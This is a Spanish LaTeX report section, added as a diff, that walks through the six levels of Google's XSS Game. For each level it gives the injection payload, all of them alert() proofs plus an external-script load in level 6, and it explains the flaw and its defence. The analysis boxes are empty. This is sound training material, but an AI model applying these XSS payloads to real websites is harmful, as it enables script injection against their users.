@@ -1,0 +1,152 @@
+% sections/05-xss.tex
+\section{Cross-Site Scripting (XSS)}
+
+\subsection{Presentación del ejercicio}
+
+Se ejecutaron los seis retos del \eng{XSS Game} de Google \cite{xss-game}, disponibles a partir de \url{https://xss-game.appspot.com/level1}, en los cuales cada nivel expone un contexto de inyección distinto (cuerpo HTML, atributos, cadenas de JavaScript, \eng{URLs} de recursos) y el objetivo en todos es lograr la ejecución de un script propio en el navegador de la víctima; como evidencia de la explotación, y tal como lo exige el enunciado, el nombre del integrante va incluido dentro del script inyectado (\texttt{Over} en los payloads de referencia, a modo de ejemplo).
+
+\begin{center}
+\small
+\begin{tabularx}{0.8\linewidth}{@{}lX@{}}
+  \toprule
+  \bfseries Nivel & \bfseries Contexto de la entrada del usuario \\
+  \midrule
+  1 & Cuerpo HTML sin ningún filtrado. \\
+  2 & Comentarios renderizados en la página, con etiqueta \texttt{<script>} bloqueada. \\
+  3 & Valor insertado dentro del atributo \texttt{src} de una imagen. \\
+  4 & Valor insertado dentro de una cadena JavaScript en un atributo \texttt{onload}. \\
+  5 & Valor insertado en el atributo \texttt{href} de un enlace. \\
+  6 & Fragmento \texttt{\#} de la URL usado como fuente de un \texttt{<script>}. \\
+  \bottomrule
+\end{tabularx}
+\end{center}
+
+\subsection{Nivel 1: inyección directa en el cuerpo HTML}
+
+\begin{lstlisting}[language=HTML]
+<script>alert('Over')</script>
+\end{lstlisting}
+
+\captura{xss-nivel1.png}{Nivel 1 resuelto: alert con el nombre del integrante}
+
+\begin{analisis}
+\end{analisis}
+
+\porque{por qué funciona}{%
+  La búsqueda se inserta tal cual en el HTML de la respuesta sin ningún
+  escapado, de forma que el navegador parsea el payload como etiqueta
+  legítima. Base: ``Al no existir sanitización alguna, cualquier etiqueta
+  inyectada en el campo de búsqueda pasa a formar parte del documento,
+  ejecutándose en el mismo origen de la aplicación.''%
+}
+
+\subsection{Nivel 2: inyección en comentarios con script bloqueado}
+
+\begin{lstlisting}[language=HTML]
+<img src="x" onerror="alert('Over')">
+\end{lstlisting}
+
+\captura{xss-nivel2.png}{Nivel 2 resuelto: handler \texttt{onerror} sobre una imagen rota}
+
+\begin{analisis}
+\end{analisis}
+
+\porque{por qué funciona}{%
+  El filtro del nivel bloquea la etiqueta \texttt{<script>}, pero no las
+  etiquetas de contenido embebido ni sus atributos de evento; al referenciar
+  una imagen inexistente (\texttt{src="x"}) el error de carga dispara
+  \texttt{onerror}. Base: ``Un bloqueo por lista negra de etiquetas resulta
+  siempre incompleto, dado que los navegadores ofrecen múltiples vectores de
+  ejecución alternativa (handlers de evento sobre etiquetas inocuas), por lo
+  que el control correcto es escapar la salida según el contexto HTML.''%
+}
+
+\subsection{Nivel 3: dentro del atributo src de una imagen}
+
+\begin{lstlisting}[language=HTML]
+' onerror='alert("Over")'
+\end{lstlisting}
+
+\captura{xss-nivel3.png}{Nivel 3 resuelto: cierre del atributo e inyección del handler}
+
+\begin{analisis}
+\end{analisis}
+
+\porque{por qué funciona}{%
+  La entrada se incrusta dentro de \texttt{<img src='INPUT'>}: la comilla
+  simple cierra el valor del atributo y lo que sigue se parsea como atributos
+  nuevos, agregando \texttt{onerror} a la propia imagen de la página. Detalle
+  relevante del nivel: aunque se inyectara un \texttt{<script>} completo, no se
+  ejecutaría porque el HTML se construye por asignación a
+  \texttt{innerHTML}, y los scripts insertados por esa vía no corren; los
+  atributos de evento sí. Menciona ambos puntos en el análisis.%
+}
+
+\subsection{Nivel 4: dentro de una cadena JavaScript en onload}
+
+\begin{lstlisting}[language=JavaScript]
+');alert('Over')//
+\end{lstlisting}
+
+\captura{xss-nivel4.png}{Nivel 4 resuelto: cierre de la llamada \texttt{startTimer} e inyección del alert}
+
+\begin{analisis}
+\end{analisis}
+
+\porque{por qué funciona}{%
+  El valor del temporizador cae dentro de \texttt{onload="startTimer('INPUT')"},
+  es decir, dentro de un literal de cadena en código JavaScript: el payload
+  cierra la cadena (\texttt{'}) y la llamada (\texttt{)}), ejecuta
+  \texttt{alert} y con \texttt{//} comenta el resto de la línea original para
+  que no quede basura sintáctica. Base: ``En contexto JavaScript el control
+  seguro no es el escapado HTML sino la codificación adecuada para ese
+  lenguaje (o no interpolar la entrada en código), pues cerrar el literal
+  basta para tomar el control del flujo.''%
+}
+
+\subsection{Nivel 5: en el atributo href de un enlace}
+
+\begin{lstlisting}[language=HTML]
+javascript:alert('Over')
+\end{lstlisting}
+
+\captura{xss-nivel5.png}{Nivel 5 resuelto: esquema \texttt{javascript:} en el enlace de compartir}
+
+\begin{analisis}
+\end{analisis}
+
+\porque{por qué funciona}{%
+  La entrada pasa a ser la URL completa del enlace \texttt{Share on Twitter},
+  y al hacer clic el navegador ejecuta el pseudoesquema
+  \texttt{javascript:}. Base: ``El punto crítico es aceptar una URL sin
+  validar su esquema; un control de allowlist (\texttt{http}/\texttt{https})
+  habría evitado la ejecución, lo cual es especialmente serio porque el
+  payload solo requiere un clic de la víctima sobre un enlace de apariencia
+  legítima.''%
+}
+
+\subsection{Nivel 6: la URL de un recurso script}
+
+\begin{lstlisting}
+#HTTPS://servidor-propio/ejemplo.js
+\end{lstlisting}
+
+\captura{xss-nivel6.png}{Nivel 6 resuelto: carga de script externo tras evadir la validación de esquema}
+
+\begin{analisis}
+\end{analisis}
+
+\porque{por qué funciona}{%
+  El fragmento posterior a \texttt{\#} se asigna como \texttt{src} de un
+  \texttt{<script>} nuevo, y la única barrera es
+  \texttt{url.match(/\^{}https?:\\/\\//)}, la cual es sensible a
+  mayúsculas: escribiendo \texttt{HTTPS://} el esquema elude la lista negra y
+  el navegador, que es tolerante al caso, carga el script igual. Requiere
+  hostear un \texttt{.js} propio (un gist en crudo sirve); alternativa sin
+  hosting a probar: \texttt{\#data:application/javascript,alert('Over')} (URI
+  \texttt{data:} como fuente del script; funciona en algunos navegadores,
+  verifícalo en tu corrida y reporta cuál de las dos vías usaste). Base: ``La
+  validación por lista negra sobre la URL resultó evadible con un simple
+  cambio de caja, evidenciando que el control de este contexto es la lista
+  blanca de esquemas y no la coincidencia de patrones.''%
+}
